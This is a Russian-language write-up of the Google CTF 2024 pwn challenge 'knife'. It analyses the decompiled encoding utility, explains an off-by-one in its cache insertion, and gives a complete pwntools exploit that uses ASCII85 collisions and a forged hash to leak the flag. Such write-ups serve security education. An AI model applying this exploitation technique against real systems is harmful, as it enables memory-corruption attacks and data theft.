---
title: "knife | Google CTF 2024 Quals"
description: Решение задания "knife" из категории pwn
summary: Решение задания "knife" из категории pwn
теги: ["writeup", "pwn", "off-by-one"]
date: 2024-07-07T21:12:56+03:00
draft: false
---

# Описание

> We made a utility for converting between various encodings. We're afraid it might leak other
> users' data though... Can you pwn it?

Задание **knife** является четвертым по сложности заданием в категории pwn.
Под конец соревнований оно имело 44 решения

# Решение

## Анализ

Запустим `file` и `checksec`:

```sh
$ file chal
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=92298ba249debf99e3d9e7bf9503673c2b346e36, for GNU/Linux 3.2.0, not stripped

$ checksec --file=chal
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols     FORTIFY Fortified   Fortifiable FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   73 Symbols  No      0           3           chal
```

Перед нами обычный нестрипнутый 64-битный ELF. Все защиты включены, кроме канарейки. Запустим бинарь:

```sh
$ ./chal
Welcome to the Swiss Knife of Encodings!
Available encodings:
- Plaintext (plain)
- Hex encoding (hex)
- Ascii85 variant (a85)
- Base64 (b64)
- Zlib (zlib)
- ROT-13 (rot13)
Example usage:
$ plain a85 test
Success. Result: N2Qab

Another example:
$ plain hex CTF{*censored*}
*censored*


Awaiting command...
hex plain 41414141
Success. Result: AAAA
Awaiting command...
```

Интерфейс программы позволяет пользователю конвертировать текст между разными кодировками. Заметим,
что в качестве примера она приводит 2 команды: декодирование `N2Qab` из ASCII 85, и кодирование
зацензуренного **флага!** в HEX

### Декомпиляция

#### `main`

```c {linenos=1,hl_lines="15 18 28-29"}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[1024]; // [rsp+0h] [rbp-460h] BYREF
  char enc[32]; // [rsp+400h] [rbp-60h] BYREF
  char dec[32]; // [rsp+420h] [rbp-40h] BYREF
  FILE *stream; // [rsp+448h] [rbp-18h]
  unsigned __int64 j; // [rsp+450h] [rbp-10h]
  unsigned __int64 i; // [rsp+458h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  memset(dec, 0, sizeof(dec));
  memset(enc, 0, sizeof(enc));
  memset(buf, 0, sizeof(buf));
  stream = fopen("/flag", "r");
  if ( stream )
  {
    __isoc99_fscanf(stream, "%s", buf);
    fclose(stream);
    puts("Welcome to the Swiss Knife of Encodings!");
    puts("Available encodings:");
    for ( i = 0LL; i <= 5; ++i )
      printf("- %s (%s)\n", fullnames[i], names[i]);
    puts("Example usage:");
    puts("$ plain a85 test");
    command("plain", "a85", "test", 1);
    puts("\nAnother example:");
    puts("$ plain hex CTF{*censored*}");
    command("plain", "hex", buf, 0);
    puts("\n");
    memset(buf, 0, sizeof(buf));
    for ( j = 0LL; j <= 1023; ++j )
    {
      puts("Awaiting command...");
      __isoc99_scanf("%20s %20s %256s", dec, enc, buf);
      if ( !strcmp(dec, "exit") )
        break;
      command(dec, enc, buf, 1);
    }
    puts("OK, I think that's enough fun... Bye!");
    fflush(_bss_start);
    return 0;
  }
  else
  {
    puts("Could not open flag...");
    return 1;
  }
}
```

Программа использует настоящее значение флага, при этом результат не выводится (только "censored")

#### `command`

Функция `command` довольно большая, поэтому рассмотрим ее по частям

##### Выбор декодера/энкодера

```c {linenos=1}
void __fastcall command(const char *decoder, const char *encoder, const char *src, int print_result)
{
  __int64 (__fastcall *dec_func)(); // rbx
  size_t srclen; // rax
  size_t v6; // rcx
  size_t enc_dst_len; // [rsp+20h] [rbp-860h] BYREF
  size_t dstlen; // [rsp+28h] [rbp-858h] BYREF
  char enc_dst[1024]; // [rsp+30h] [rbp-850h] BYREF
  char dst[1024]; // [rsp+430h] [rbp-450h] BYREF
  const char *v13; // [rsp+830h] [rbp-50h]
  void *hash; // [rsp+838h] [rbp-48h]
  int v15; // [rsp+844h] [rbp-3Ch]
  unsigned __int64 k; // [rsp+848h] [rbp-38h]
  unsigned __int64 j; // [rsp+850h] [rbp-30h]
  unsigned __int64 cur_cache_idx; // [rsp+858h] [rbp-28h]
  unsigned __int64 i; // [rsp+860h] [rbp-20h]
  int enc_idx; // [rsp+868h] [rbp-18h]
  int dec_idx; // [rsp+86Ch] [rbp-14h]

  dec_idx = -1;
  enc_idx = -1;
  for ( i = 0LL; i <= 5; ++i )
  {
    if ( !strcmp(names[i], decoder) )
      dec_idx = i;
    if ( !strcmp(names[i], encoder) )
      enc_idx = i;
  }
  if ( dec_idx == -1 )
  {
    printf("Invalid encoding: %s\n", decoder);
    return;
  }
  if ( enc_idx == -1 )
  {
    printf("Invalid encoding: %s\n", encoder);
    return;
  }
  if ( !decoders[dec_idx] )
  {
    puts("Sorry, that decoder is not implemented... Pull requests are welcome!");
    return;
  }
  if ( !encoders[enc_idx] )
  {
    puts("Sorry, that encoder is not implemented... Pull requests are welcome!");
    return;
  }
```

Несмотря на большой перечень кодировок, предлагаемый программой, реализовано всего две - ASCII85 и HEX

<details>
  <summary><code>encoders[]</code> и <code>decoders[]</code></summary>

```plain
.data:0000000000005140 ; __int64 (__fastcall *encoders[6])()
.data:0000000000005140 encoders        dq offset no_op         ; DATA XREF: command+143↑o
.data:0000000000005140                                         ; command+409↑o
.data:0000000000005148                 dq offset encodehex
.data:0000000000005150                 dq offset encode85
.data:0000000000005158                 dq 0
.data:0000000000005160                 dq 0
.data:0000000000005168                 dq 0
.data:0000000000005170                 dq 0
.data:0000000000005178 funcs_2211      dq 0                    ; DATA XREF: command+186↑r
.data:0000000000005180                 public decoders
.data:0000000000005180 ; __int64 (__fastcall *decoders[6])()
.data:0000000000005180 decoders        dq offset no_op         ; DATA XREF: command+112↑o
.data:0000000000005180                                         ; command+17F↑o
.data:0000000000005188                 dq offset decodehex
.data:0000000000005190                 dq offset decode85
.data:0000000000005198                 dq 0
.data:00000000000051A0                 dq 0
.data:00000000000051A8                 dq 0
.data:00000000000051A8 _data           ends
```

</details>

##### Декодирование и кэширование

```c {linenos=1,linenostart=49}
  dstlen = 1024LL;
  dec_func = decoders[dec_idx];
  srclen = strlen(src);
  v15 = (dec_func)(dst, src, &dstlen, srclen);
  if ( !v15 )
  {
    puts("Decoding failed...");
    return;
  }
  hash = sha256(dst, dstlen);
  cur_cache_idx = -1LL;
  for ( j = 0LL; j <= 9; ++j )
  {
    if ( cache[j].hash && !memcmp(hash, cache[j].hash, 64uLL) )
      cur_cache_idx = j;
  }
  if ( cur_cache_idx == -1LL )
  {
    cur_cache_idx = robin_0;
    robin_0 = (robin_0 + 1) % 10uLL;
    cache[cur_cache_idx].hash = hash;
    for ( k = 0LL; k <= 5; ++k )
      cache[cur_cache_idx].encoders[k] = 0LL;
  }
  v13 = get(cache[cur_cache_idx].encoders, encoder);
  put(cache[cur_cache_idx].encoders, "plain", dst, dstlen);
  v6 = strlen(src);
  put(cache[cur_cache_idx].encoders, decoder, src, v6);
```

Здесь происходит декодирование текста в plain, а также поиск ячейки в кэше, осуществляемый по
sha256 от декодированной строки. Если такая ячейка не была найдена, то используется следующая по
счету (если счетчик достигает конца кеша, он обнуляется). Затем, в кэш добавляются возможные
результаты кодирования: исходная кодировка и текст, полученный на входе; plain кодировка и
декодированная строка.

Кэш состоит из 10 ячеек. Каждая ячейка имеет `char *` на sha256 от plain строки (ключ) и массив
`char *[6]` записей вычисленных ранее результатов кодирования

![Значения кэша после запуска программы](default_cache.png)

##### Кодирование, кэширование, вывод

```c {linenos=1,linenostart=77}
  if ( v13 )
  {
    if ( print_result )
      printf("Serving from cache. Result: %s\n", v13);
  }
  else
  {
    enc_dst_len = 1024LL;
    v15 = (encoders[enc_idx])(enc_dst, dst, &enc_dst_len, dstlen);
    if ( !v15 )
    {
      puts("Encoding failed...");
      return;
    }
    if ( print_result )
      printf("Success. Result: %s\n", enc_dst);
    put(cache[cur_cache_idx].encoders, encoder, enc_dst, enc_dst_len);
  }
  if ( !print_result )
    puts("*censored*");
}
```

#### `put`

```c {linenos=1,hl_lines="17 23"}
void __fastcall put(char **cache, const char *encoder, const char *dst_enc, size_t dst_enc_len)
{
  size_t encoder_len; // rax
  size_t v5; // rdx
  char *v6; // rcx
  size_t v7; // rdx
  char *dest; // [rsp+20h] [rbp-10h]
  unsigned __int64 i; // [rsp+28h] [rbp-8h]

  encoder_len = strlen(encoder);
  dest = safe_malloc(dst_enc_len + encoder_len + 1);
  v5 = strlen(encoder);
  memcpy(dest, encoder, v5);
  v6 = &dest[strlen(encoder)];
  memcpy(v6, dst_enc, dst_enc_len);
  dest[strlen(encoder) + dst_enc_len] = 0;
  for ( i = 0LL; i <= 5 && cache[i]; ++i )
  {
    v7 = strlen(encoder) + dst_enc_len;
    if ( !memcmp(dest, cache[i], v7) )
      return;
  }
  cache[i] = dest;
}
```

Каждая добавляемая в кэш запись получается путем конкатенации короткого названия кодировки (plain/a85/hex)
и результата декодера/энкодера. Если такая запись уже есть, то ничего не происходит

Не трудно заметить, что в `put` присутствует ошибка Off-by-one, которая позволяет нам переехать
первый QWORD следующей ячекйки кэша (по совместительству являющимся указателем на хэш sha256)

## Эксплуатация

Давайте заполним весь кэш, чтобы счетчик обнулился и выдал ячейку в начале кэша. Заполнив ячейку
полностью, с помощью бага Off-by-one мы сможем переписать значение хэша следующей ячейки
(содержащей флаг) хэшем специальной строки. Теперь остается закодировать данную строку в plain,
чтобы получить флаг из кэша.

### Выбор хэша SHA256

Так как хэш переписывается строкой формата `название энкодера + результат кодирования`, то каждый
символ названия и результата должен быть в HEX алфавите. Нам подходит только энкодер ASCII85
(сокр. `a85`). Стоит отметить, что длина декодируемой строки должна быть кратна 5 (размеру группы)

```python {linenos=1}
from pwn import *

from hashlib import sha256
from itertools import product
from string import ascii_letters


for s in product(ascii_letters, repeat=5):
    SOURCE_STRING = ''.join(s).encode()
    h = sha256(SOURCE_STRING).hexdigest()

    if h[:3] == 'a85':
        log.info(f'String: {SOURCE_STRING}')
        log.info(f'Hash: {h}')

        HASH_PART = h[3:]
        HASH_PART += 'a' * (-len(HASH_PART) % 5)
        break
```

```plain
[*] String: b'aabss'
[*] Hash: a85b891727674ac83fa143bf4849b9a8e52550eafef891b3c7b01fd9d22ad5ef
```

### Коллизия ASCII85

Так как нам доступно всего 2 декодера, а заполнить ячейку нужно 6-ю уникальными записями,
необходимо придумать коллизию. ASCII85 позволяет кодировать одной группой переменное количество
байт (от 1 до 4). Таким образом, разбив одну строку разными способами, мы получим разные строки в
ASCII85

```sh
Awaiting command...
plain a85 A
Success. Result: )R5p|
Awaiting command...
plain a85 AA
Success. Result: ll}o|
Awaiting command...
plain a85 AAA
Success. Result: Q4pU|
Awaiting command...
plain a85 AAAA
Success. Result: 5)w|K
```

Разобьем строку "AAAAAAAAA" в 3 группы разных размеров:

```python {linenos=1}
def gen_collisions(patterns):
    _blocks = (')R5p|', 'll}o|', 'Q4pU|', '5)w|K')
    res = []

    for pattern in patterns:
        res.append('')
        for block in pattern:
            res[-1] += _blocks[block - 1]

    return res

coll = gen_collisions([
    (4, 4, 1), (4, 1, 4), (1, 4, 4),
    (4, 3, 2), (2, 4, 3), (3, 2, 4)
])
```

### Собираем вместе

Так как <a href="#hl-5-62" data-target="code-block">сравнение хэшей</a> осуществляется функцией
`memcmp`, мы можем спокойно дописать в конец хэша строку с коллизией. При этом кэш будет выглядеть
так:

![Значения кэша после эксплуатации](cache_after_exploit.png)

<details>
  <summary>Эксплоит</summary>

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 1234 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1234)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.STRACE:
        with tempfile.NamedTemporaryFile(prefix='pwnlib-log-', suffix='.strace',
                                         delete=False, mode='w') as tmp:
            log.debug('Created strace log file %r\n', tmp.name)
            run_in_new_terminal(['tail', '-f', '-n', '+1', tmp.name])
            return process(['strace', '-o', tmp.name, '--'] + [exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def num(n):
    return str(n).encode()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

from hashlib import sha256
from itertools import product
from string import ascii_letters

MENU = b'command...\n'

def gen_collisions(patterns):
    _blocks = (')R5p|', 'll}o|', 'Q4pU|', '5)w|K')
    res = []

    for pattern in patterns:
        res.append('')
        for block in pattern:
            res[-1] += _blocks[block - 1]

    return res


for s in product(ascii_letters, repeat=5):
    SOURCE_STRING = ''.join(s).encode()
    h = sha256(SOURCE_STRING).hexdigest()

    if h[:3] == 'a85':
        log.info(f'String: {SOURCE_STRING}')
        log.info(f'Hash: {h}')

        HASH_PART = h[3:]
        HASH_PART += 'a' * (-len(HASH_PART) % 5)
        break

coll = gen_collisions([
    (4, 4, 1), (4, 1, 4), (1, 4, 4),
    (4, 3, 2), (2, 4, 3), (3, 2, 4)
])

io = start()

# Fill cache to control first cache entry
for i in range(8):
    io.sendlineafter(MENU, b'plain plain ' + num(i))

# Fill cache entry
for c in coll:
    io.sendlineafter(MENU, f'a85 plain {HASH_PART}{c}'.encode())

io.sendlineafter(MENU, b'plain plain ' + SOURCE_STRING)

io.interactive()

```

</details>

![Флаг сдан](flag_submitted.gif)
